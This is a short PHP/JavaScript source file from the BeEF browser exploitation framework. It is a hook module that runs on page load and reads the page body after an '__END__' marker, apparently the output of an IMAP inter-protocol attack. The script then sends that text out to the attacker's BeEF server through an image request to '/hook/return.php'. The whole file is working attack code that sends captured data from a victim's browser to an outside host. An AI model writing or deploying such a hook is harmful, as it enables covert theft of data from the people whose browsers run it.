<?
	// Copyright (c) 2006-2009, Wade Alcorn 
	// All Rights Reserved
	// wade@bindshell.net - http://www.bindshell.net

	require_once("../include/globals.inc.php");
?>

onload = beef_onload;

beef_url = "<?= BEEF_DOMAIN; ?>";

function beef_onload() {
	raw_imap_output=document.body.innerHTML;
	pos=raw_imap_output.indexOf('__END__');
	result=raw_imap_output.substring(pos+37, raw_imap_output.length);
	result=result.replace(/\n/g,"CR");
	return_result(result_id, result);
}


// ---[ RETURN_RESULT
// send result to beef
function return_result(action, data) {
	var img_tmp = new Image();
	var src = beef_url + '/hook/return.php?action=' + action + '&data=' + escape(data);
	img_tmp.src = src;
}

